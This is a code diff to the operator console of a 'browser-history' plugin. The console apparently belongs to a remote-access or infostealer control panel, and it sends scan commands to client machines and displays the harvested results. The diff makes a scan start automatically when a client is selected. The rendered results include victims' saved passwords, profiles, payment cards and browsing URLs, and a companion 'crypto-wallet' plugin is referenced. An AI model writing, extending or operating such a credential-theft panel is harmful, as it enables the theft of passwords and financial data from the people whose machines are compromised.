@@ -13,6 +13,7 @@ const cardsArea         = document.getElementById("cards-area");
 const logEl             = document.getElementById("log");
 
 const pluginId = "browser-history";
+// Read clientId from URL — same approach as crypto-wallet
 const clientId = params.get("clientId") || "";
 clientIdInput.value = clientId;
 
@@ -28,8 +29,9 @@ function setStatus(text, cls) {
   statusPill.className = "status-pill " + cls;
 }
 
-function getClientId() {
-  return clientIdInput.value.trim();
+// Prefer URL clientId, fall back to whatever was manually typed
+function getEffectiveClientId() {
+  return clientId || clientIdInput.value.trim();
 }
 
 function escapeHtml(s) {
@@ -52,8 +54,8 @@ function groupByFirstLetter(items, keyFn) {
 }
 
 async function sendPluginEvent(event, payload) {
-  const id = getClientId();
-  if (!id) { log("No client ID"); return; }
+  const id = getEffectiveClientId();
+  if (!id) { log("No client ID — open from a client context or paste one above"); return; }
   try {
     const res = await fetch(
       `/api/clients/${encodeURIComponent(id)}/plugins/${pluginId}/event`,
@@ -62,6 +64,9 @@ async function sendPluginEvent(event, payload) {
     if (!res.ok) {
       const text = await res.text();
       log(`sendEvent failed: ${res.status} ${text}`);
+    } else {
+      const data = await res.json().catch(() => ({}));
+      if (data.queued) log("Event queued — waiting for plugin to load on client\u2026");
     }
   } catch (err) {
     log(`sendEvent error: ${err.message}`);
@@ -69,7 +74,7 @@ async function sendPluginEvent(event, payload) {
 }
 
 async function pollEvents() {
-  const id = getClientId();
+  const id = getEffectiveClientId();
   if (!id) return;
   try {
     const res = await fetch(
@@ -134,7 +139,7 @@ function renderResults(entries, total) {
 
 function handleIncomingEvent(event, payload) {
   if (event === "ready") {
-    log("Plugin ready \u2014 scanning\u2026");
+    log("Plugin ready on client \u2014 auto-scan started");
     setStatus("Scanning\u2026", "status-scanning");
   } else if (event === "history_result") {
     stopPolling();
@@ -142,7 +147,9 @@ function handleIncomingEvent(event, payload) {
     const pwdTotal     = payload?.passwordTotal ?? 0;
     const profileTotal = payload?.profileTotal ?? 0;
     const cardTotal    = payload?.cardTotal ?? 0;
-    log(`Done \u2014 ${total} URLs \u00B7 ${pwdTotal} passwords \u00B7 ${profileTotal} profiles \u00B7 ${cardTotal} cards`);
+    const errors       = payload?.errors ?? [];
+    log(`Scan complete \u2014 ${total} URLs \u00B7 ${pwdTotal} passwords \u00B7 ${profileTotal} profiles \u00B7 ${cardTotal} cards`);
+    if (errors.length) log(`Scan errors (${errors.length}): ${errors.slice(0,3).join("; ")}`);
     setStatus(`${pwdTotal} pwd \u00B7 ${profileTotal} profiles \u00B7 ${cardTotal} cards \u00B7 ${total} URLs`, "status-found");
     renderPasswords(payload?.passwords ?? [], pwdTotal);
     renderProfiles(payload?.profiles ?? [], profileTotal);
@@ -165,21 +172,23 @@ function stopPolling() {
 }
 
 scanBtn.addEventListener("click", async () => {
-  const id = getClientId();
+  const id = getEffectiveClientId();
   if (!id) { log("Enter a Client ID first"); return; }
   scanBtn.disabled = true;
   setStatus("Scanning\u2026", "status-scanning");
-  log(`Scanning client: ${id}`);
+  log(`Manual scan \u2014 client: ${id}`);
   await sendPluginEvent("scan", {});
   startPolling();
-  log("Polling for results\u2026");
 });
 
+// ── Init ──────────────────────────────────────────────────────────────────────
+log(`JS loaded \u2014 url clientId: "${clientId}" \u2014 location: ${window.location.pathname}`);
+
 if (!clientId) {
-  log("No clientId in URL \u2014 paste one above and click Scan");
-  setStatus("No client", "status-idle");
+  log("No clientId in URL \u2014 open from a client context menu, or paste one above and click Scan");
+  setStatus("No client selected", "status-idle");
 } else {
-  log(`Client: ${clientId}`);
-  setStatus("Awaiting scan\u2026", "status-scanning");
+  log(`Client: ${clientId} \u2014 waiting for auto-scan result\u2026`);
+  setStatus("Awaiting auto-scan\u2026", "status-scanning");
   startPolling();
 }
